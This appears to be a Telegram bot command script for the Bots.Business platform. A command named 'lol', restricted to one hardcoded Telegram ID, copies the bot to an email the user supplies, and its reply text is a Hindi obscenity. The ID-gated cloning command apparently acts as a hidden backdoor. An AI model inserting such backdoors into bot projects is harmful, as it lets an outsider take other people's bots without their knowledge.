/*CMD
  command: lol
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: madarchod mail de bhenchod

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

if (user.telegramid == 1950244540){
BBAdmin.installBot({
  email: message,
  bot_id: bot.id
})
Bot.sendMessage("Done")
}else{
Bot.sendMessage("Not admin")
}
